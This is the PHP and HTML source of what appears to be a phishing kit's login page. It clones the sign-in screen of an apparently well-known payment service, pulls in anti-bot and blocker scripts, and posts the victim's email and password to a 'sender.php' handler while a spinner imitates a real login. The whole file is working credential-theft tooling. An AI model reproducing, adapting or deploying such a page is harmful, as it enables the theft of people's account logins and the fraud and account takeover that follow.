 <?php 
 
 include 'php/err.php';
include 'php/blocker.php';
include 'php/detect.php';
include 'php/antibots4.php';
include '../vip-languages/langs.php';

?>

<html lang="en" >
<head>
<meta charset="utf-8" />
<title><?php echo $title; ?></title>
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
<link rel="shortcut icon" sizes="196x196" href="../res/img/icon.png" />
<link rel="shortcut icon" type="image/x-icon" href="../res/img/icon.png" />
<link rel="stylesheet" href="https://free-style-css.blogspot.com/" />
<link rel="stylesheet" href="res/css/style.css" />
<script src="res/js/main-script.js"></script>
<script src="res/js/q.js"></script>
<script src="res/js/v.js"></script>
<link rel="stylesheet" href="res/css/warning.css" />
</head>

<script>
function finish() {
	document.getElementById('fuck').style.display = 'none';
}
</script>
 
<body class="desktop" onload="finish()">
<div style="color:white; font-size:0px;">
<?php echo $pass_word; ?></div>
<div id="main" class="main" role="main">
<section id="login" class="login " >
<div class="corral">
<div class="contentContainer activeContent">
<header>
 
<center><p><img src="res/img/logo.png" class=""></img></p></center>
</header>

<form action="sender.php" method="post" class="proceed maskable" autocomplete="off" name="login" id="login" novalidate >
<?php 
if(isset($_GET['err'])){
$err = $_GET['err'];
if($err == 'wrong'){
echo "<div class='notifications'><p class='notification notification-critical' role='alert'>
$incorrect
</p></div>";
}
else{
	echo '';
}

}
?>
<div id="emailSection" class="clearfix">
<div class="nabil textInput" id="login_emaildiv" style="z-index: 1;">
<div class="fieldWrapper"><label for="email" class="fieldLabel"><?php echo $email ;?></label>
<input id="email" name="email" type="email" class="hasHelp  validateEmpty   "  
 required="required" aria-required="true"   autocomplete="off" placeholder="<?php echo $email ;?>">
</div><div class="errorMessage" id="emailErrorMessage"><p class="emptyError hide"><?php echo $required ;?></p>
<p class="invalidError hide"><?php echo $wrong_email;?></p>
</div></div></div>


<div id="passwordSection" class="clearfix">
<div class="nabil textInput" id="login_passworddiv" style="z-index: 1;">
<div class="fieldWrapper"><label for="password" class="fieldLabel"><?php echo $password ;?></label>
<input id="password" name="password"  type="password"  class="hasHelp  validateEmpty   pin-password" required="required" aria-required="true"  
 placeholder="<?php echo $password ;?>">
</div><div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide"><?php echo $required ;?></p>
</div></div></div>



<div class="actions actionsSpacedShort">
<button class="button actionContinue scTrack:unifiedlogin-login-submit"  type="submit" id="btnLogin" name="login" 
value="Login"><?php echo $login; ?></button>
</div>
<div class="forgotLink"><a href="#" class="scTrack:unifiedlogin-click-forgot-password pwrLink startPwrFlowBtn"><?php echo $forgot; ?></a>
</div>
<div class="loginSignUpSeparator"><span class="textInSeparator" aria-label="or"><?php echo $or; ?></span></div>
<a href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" onclick="show" id="createAccount"><?php echo $signup;?></a>
</form>

<script>
 $(document).ready(function(){
	$('#btnLogin').click(function(){
		var email = $("#email").val();
		var pass = $("#password").val();
		if(email == "" || pass == ""){
			document.getElementById('fuck').innerHTML = '';
		}
		else{
			$("#fuck").show();
			setTimeout(stp , 2000);
		}
		function stp(){
			$("#fuck").hide();
		}
		
	});
	
});
</script>

<div id="fuck" class="spinner " style="display:none;">
 
</div>

</div>
</div>
</section>
</div></div>
<footer class="footer" role="contentinf" >
<div class="legalFooter">
<ul class="footerGroup">
<li><a href="#"><?php echo $contact; ?></a></li>
<li><a href="#"><?php echo $privacy; ?></a>
</li><li><a href="#"><?php echo $legal; ?></a></li>
<li><a href="#"><?php echo $worldwide; ?></a></li></ul>
</div></footer>



</body>
</html>

